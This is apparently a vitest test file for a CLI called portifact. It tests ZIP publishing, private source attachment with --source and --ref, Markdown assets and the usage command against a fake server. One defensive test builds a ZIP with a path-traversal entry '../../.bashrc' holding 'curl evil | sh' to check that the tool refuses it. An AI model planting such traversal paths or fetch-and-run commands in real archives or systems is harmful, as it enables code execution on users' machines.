// portifact publish with ZIP input, private sources (--source, --ref) and Markdown assets, and
// portifact usage, against the fake server.
import { execFileSync } from "node:child_process";
import { mkdir, mkdtemp, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { gitRunner } from "./git.ts";
import { sha256Of } from "./testing/fake-api.ts";
import { type FakeServer, startFakeServer } from "./testing/fake-server.ts";
import { createHarness, type Harness } from "./testing/harness.ts";
import { buildZip } from "./testing/zip-writer.ts";

let server: FakeServer;
let h: Harness;

beforeAll(() => {
  process.env.GIT_CONFIG_GLOBAL = "/dev/null";
  process.env.GIT_CONFIG_NOSYSTEM = "1";
});

let scratchTmp: string;
let previousTmp: string | undefined;

beforeEach(async () => {
  // Expansions land in a folder of this file alone, so tests that run in parallel and use the
  // same prefixes in the shared temporary folder cannot look like leftovers.
  previousTmp = process.env.TMPDIR;
  scratchTmp = await mkdtemp(join(tmpdir(), "pf-inputs-tmp-"));
  process.env.TMPDIR = scratchTmp;
  server = await startFakeServer();
  h = await createHarness({ server });
});

afterEach(async () => {
  await h.cleanup();
  await server.close();
  if (previousTmp === undefined) delete process.env.TMPDIR;
  else process.env.TMPDIR = previousTmp;
  await rm(scratchTmp, { recursive: true, force: true });
});

function prepareBody() {
  const request = server.requests.find(
    (r) => r.method === "POST" && r.path === "/api/v1/publishes",
  );
  return request ? JSON.parse(request.body) : undefined;
}

async function zipAt(name: string, entries: Parameters<typeof buildZip>[0]): Promise<string> {
  await mkdir(h.workspace, { recursive: true });
  const path = join(h.workspace, name);
  await writeFile(path, buildZip(entries));
  return path;
}

function git(cwd: string, ...args: string[]): string {
  return execFileSync(
    "git",
    ["-c", "user.name=Test", "-c", "user.email=test@example.test", ...args],
    { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] },
  ).trim();
}

/** Everything in this file's temporary folder but the harness's own folder. */
async function tmpLeftovers(): Promise<string[]> {
  const entries = await readdir(scratchTmp);
  return entries.filter((name) => !h.workspace.startsWith(join(scratchTmp, name)));
}

describe("publish a ZIP file", () => {
  it("publishes its files as a site, without the shared folder or excluded entries", async () => {
    h.signIn();
    const zip = await zipAt("delivery.zip", [
      { name: "delivery/index.html", data: "<h1>Delivery</h1>" },
      { name: "delivery/css/app.css", data: "h1{}" },
      { name: "delivery/.env", data: "TOKEN=x" },
    ]);
    const result = await h.invoke("publish", zip);
    expect(result.code, result.stderr).toBe(0);
    const body = prepareBody();
    expect(body).toMatchObject({ type: "site", name: "delivery.zip", entrypoint: "index.html" });
    expect(body.files.map((file: { path: string }) => file.path)).toEqual([
      "index.html",
      "css/app.css",
    ]);
    expect(result.stderr).toContain("delivery/.env  (may hold secrets)");
    expect(server.api.stored.has(sha256Of("<h1>Delivery</h1>"))).toBe(true);
  });

  it("refuses a hostile ZIP with a clear error and uploads nothing", async () => {
    h.signIn();
    const zip = await zipAt("evil.zip", [
      { name: "index.html", data: "<p>ok</p>" },
      { name: "../../.bashrc", data: "curl evil | sh" },
    ]);
    const result = await h.invoke("publish", zip, "--json");
    expect(result.code).toBe(2);
    expect(JSON.parse(result.stdout)).toEqual({
      error: { code: "invalid_input", message: expect.stringMatching(/unsafe path/) },
    });
    expect(prepareBody()).toBeUndefined();
  });

  it("refuses a ZIP as a document type", async () => {
    const zip = await zipAt("doc.zip", [{ name: "a.md", data: "# A" }]);
    const result = await h.invoke("publish", zip, "--type", "markdown", "--dry-run");
    expect(result.code).toBe(2);
    expect(result.stderr).toContain("A ZIP file can only be published as a site");
  });

  it("removes the expanded files after publishing", async () => {
    const zip = await zipAt("site.zip", [{ name: "index.html", data: "<p>x</p>" }]);
    const result = await h.invoke("publish", zip, "--dry-run", "--json");
    expect(result.code, result.stderr).toBe(0);
    expect(await tmpLeftovers()).toEqual([]);
  });
});

describe("publish --source", () => {
  it("attaches git-chosen sources and their origin, owner-only", async () => {
    h.signIn();
    const dist = await h.files("dist", { "index.html": "<p>built</p>" });
    const repo = await h.files("repo", {
      "src/app.ts": "export {};",
      ".gitignore": "dist/\n",
      ".env": "SECRET=1",
    });
    git(repo, "init", "-q", "-b", "main");
    git(repo, "add", "src/app.ts", ".gitignore");
    git(repo, "commit", "-q", "-m", "first");
    git(repo, "remote", "add", "origin", "https://user:token@example.test/o/r.git");
    const head = git(repo, "rev-parse", "HEAD");

    const result = await h.invoke("publish", dist, "--source", repo, "--json");
    expect(result.code, result.stderr).toBe(0);
    const body = prepareBody();
    expect(
      body.files.map((file: { path: string; kind: string }) => `${file.kind}:${file.path}`),
    ).toEqual(["published:index.html", "source:.gitignore", "source:src/app.ts"]);
    // .env is untracked but not ignored: git would list it, the secret filter does not attach it.
    expect(result.stderr).toContain(".env  (may hold secrets)");
    expect(result.stderr).toContain("chosen by git");
    expect(body.sourceOrigin).toEqual({
      commit: head,
      branch: "main",
      remote: "https://example.test/o/r.git",
      dirty: true,
    });
    const output = JSON.parse(result.stdout);
    expect(output).toMatchObject({ sourceFiles: 2, sourceOrigin: body.sourceOrigin });
    expect(JSON.stringify(output)).not.toContain("token");

    const versions = await h.invoke("versions", output.artifactId, "--json");
    expect(JSON.parse(versions.stdout).items[0].sourceOrigin).toEqual(body.sourceOrigin);
  });

  it("attaches the exact tree of --ref and shows it in a dry run", async () => {
    const dist = await h.files("dist", { "index.html": "<p>built</p>" });
    const repo = await h.files("repo", { "main.ts": "v1" });
    git(repo, "init", "-q", "-b", "main");
    git(repo, "add", "-A");
    git(repo, "commit", "-q", "-m", "v1");
    await writeFile(join(repo, "main.ts"), "work in progress");

    const result = await h.invoke(
      "publish",
      dist,
      "--source",
      repo,
      "--ref",
      "HEAD",
      "--dry-run",
      "--json",
    );
    expect(result.code, result.stderr).toBe(0);
    const output = JSON.parse(result.stdout);
    expect(output.sources).toMatchObject({
      chosenBy: "git",
      files: [{ path: "main.ts", sha256: sha256Of("v1") }],
      origin: { branch: "main", dirty: false, remote: null },
      lfsPointers: [],
    });
  });

  it("removes the expanded tree of --ref when reading its origin fails", async () => {
    const real = gitRunner();
    const failing = await createHarness({
      server,
      // The origin's remote is read with git config; a git that cannot run fails the publish.
      git: (args, cwd, options) =>
        args[0] === "config"
          ? Promise.reject(new Error("spawn git EAGAIN"))
          : real(args, cwd, options),
    });
    try {
      const dist = await failing.files("dist", { "index.html": "<p>built</p>" });
      const repo = await failing.files("repo", { "main.ts": "v1" });
      git(repo, "init", "-q", "-b", "main");
      git(repo, "add", "-A");
      git(repo, "commit", "-q", "-m", "v1");

      await expect(
        failing.invoke("publish", dist, "--source", repo, "--ref", "HEAD", "--dry-run"),
      ).rejects.toThrow("spawn git EAGAIN");
      const entries = await readdir(scratchTmp);
      expect(entries.filter((name) => /^portifact-(zip|git)-/.test(name))).toEqual([]);
    } finally {
      await failing.cleanup();
    }
  });

  it("prints sources and their origin in a text dry run, and warns about LFS pointers", async () => {
    const dist = await h.files("dist", { "index.html": "<p>built</p>" });
    const repo = await h.files("repo", {
      "model.bin": "version https://git-lfs.github.com/spec/v1\noid sha256:1\nsize 9\n",
    });
    git(repo, "init", "-q", "-b", "main");
    git(repo, "add", "-A");
    git(repo, "commit", "-q", "-m", "c");
    const result = await h.invoke("publish", dist, "--source", repo, "--dry-run");
    expect(result.code, result.stderr).toBe(0);
    expect(result.stdout).toContain("1 private source file");
    expect(result.stdout).toMatch(/Source origin: commit [0-9a-f]{12} on main\./);
    expect(result.stderr).toContain("1 source file is a Git LFS pointer");
  });

  it("attaches a ZIP of sources", async () => {
    h.signIn();
    const dist = await h.files("dist", { "index.html": "<p>built</p>" });
    const zip = await zipAt("project.zip", [{ name: "project/src/a.ts", data: "a" }]);
    const result = await h.invoke("publish", dist, "--source", zip);
    expect(result.code, result.stderr).toBe(0);
    const body = prepareBody();
    expect(body.files.filter((f: { kind: string }) => f.kind === "source")).toEqual([
      expect.objectContaining({ path: "src/a.ts", sha256: sha256Of("a") }),
    ]);
    expect(body.sourceOrigin).toBeUndefined();
  });

  it("refuses --ref without --source, and too many files in total", async () => {
    const dist = await h.files("dist", { "index.html": "<p>x</p>" });
    const noSource = await h.invoke("publish", dist, "--ref", "HEAD", "--dry-run");
    expect(noSource.code).toBe(2);
    expect(noSource.stderr).toContain("--ref works only with --source");

    const many: Record<string, string> = {};
    for (let i = 0; i < 600; i++) many[`f${i}.txt`] = String(i);
    const big = await h.files("big", { "index.html": "x", ...many });
    const src = await h.files("src", many);
    const tooMany = await h.invoke("publish", big, "--source", src, "--dry-run");
    expect(tooMany.code).toBe(7);
    expect(tooMany.stderr).toContain("published and sources together");
  });
});

describe("publish --assets", () => {
  it("publishes a Markdown document with its assets at their relative paths", async () => {
    h.signIn();
    const docs = await h.files("docs", {
      "plan.md": "# Plan\n\n![chart](img/chart.png)",
      "img/chart.png": "png",
      "img/.env": "S=1",
    });
    const result = await h.invoke("publish", join(docs, "plan.md"), "--assets", join(docs, "img"));
    expect(result.code, result.stderr).toBe(0);
    const body = prepareBody();
    expect(body).toMatchObject({ type: "markdown", entrypoint: "plan.md" });
    expect(
      body.files.map((f: { path: string; contentType: string }) => [f.path, f.contentType]),
    ).toEqual([
      ["plan.md", "text/markdown; charset=utf-8"],
      ["img/chart.png", "image/png"],
    ]);
  });

  it("accepts the document's own folder without listing the document twice", async () => {
    const docs = await h.files("docs", { "plan.md": "# Plan", "logo.svg": "<svg/>" });
    const result = await h.invoke(
      "publish",
      join(docs, "plan.md"),
      "--assets",
      docs,
      "--dry-run",
      "--json",
    );
    expect(result.code, result.stderr).toBe(0);
    expect(JSON.parse(result.stdout).files.map((f: { path: string }) => f.path)).toEqual([
      "plan.md",
      "logo.svg",
    ]);
  });

  it("refuses assets for other types, outside the document's folder, or not a folder", async () => {
    const docs = await h.files("docs", { "plan.md": "# Plan", "notes.txt": "n" });
    const other = await h.files("elsewhere", { "a.png": "a" });
    const site = await h.invoke("publish", join(docs, "notes.txt"), "--assets", other, "--dry-run");
    expect(site.stderr).toContain("--assets works only with Markdown");
    const outside = await h.invoke(
      "publish",
      join(docs, "plan.md"),
      "--assets",
      other,
      "--dry-run",
    );
    expect(outside.stderr).toContain("must be inside the folder of the Markdown file");
    const file = await h.invoke(
      "publish",
      join(docs, "plan.md"),
      "--assets",
      join(docs, "notes.txt"),
      "--dry-run",
    );
    expect(file.stderr).toContain("is not a folder");
  });
});

describe("portifact usage", () => {
  it("shows quotas, usage and that nothing blocks the account", async () => {
    h.signIn();
    server.api.usage.activeArtifacts.used = 3;
    server.api.usage.storage = { used: 1_500_000, reserved: 2_000, limit: 2_500_000_000 };
    server.api.usage.trafficThisMonth.requests.used = 12_345;
    server.api.usage.trafficThisMonth.bytes.used = 3_200_000_000;
    const result = await h.invoke("usage");
    expect(result.code, result.stderr).toBe(0);
    expect(result.stdout).toContain("Active artifacts");
    expect(result.stdout).toMatch(/Active artifacts\s+3 of 50/);
    expect(result.stdout).toContain("1.5 MB of 2.5 GB (+2.0 kB reserved by uploads)");
    expect(result.stdout).toContain("resets 2026-12-01 00:00 UTC");
    expect(result.stdout).toMatch(
      /Traffic this month\s+12345 of 1000000 requests, 3\.2 GB of 25\.0 GB \(resets 2026-12-01 00:00 UTC\)/,
    );
    expect(result.stdout).toContain("Nothing blocks your account.");
  });

  it("lists what blocks the account and when it lifts, and prints JSON as the API sends it", async () => {
    h.signIn();
    server.api.usage.blocks = [
      {
        reason: "publishes_per_24h",
        stops: "publishing",
        message: "You published 100 times in the last 24 hours.",
        until: "2026-11-09T08:30:00.000Z",
      },
      {
        reason: "storage",
        stops: "publishing",
        message: "Your 2.5 GB of storage is full.",
        until: null,
      },
      {
        reason: "traffic",
        stops: "serving",
        message: "Your artifacts served this month's traffic.",
        until: "2026-12-01T00:00:00.000Z",
      },
    ];
    const text = await h.invoke("usage");
    expect(text.stdout).toContain("Blocked now:");
    expect(text.stdout).toContain(
      "  You published 100 times in the last 24 hours. Lifts 2026-11-09 08:30 UTC.",
    );
    expect(text.stdout).toContain("  Your 2.5 GB of storage is full.\n");
    expect(text.stdout).toContain(
      "  Your artifacts served this month's traffic. Lifts 2026-12-01 00:00 UTC.",
    );

    const json = await h.invoke("usage", "--json");
    expect(JSON.parse(json.stdout)).toEqual(server.api.usage);
  });

  it("needs a session", async () => {
    const result = await h.invoke("usage", "--json");
    expect(result.code).toBe(3);
    expect(JSON.parse(result.stdout).error.code).toBe("unauthenticated");
  });
});
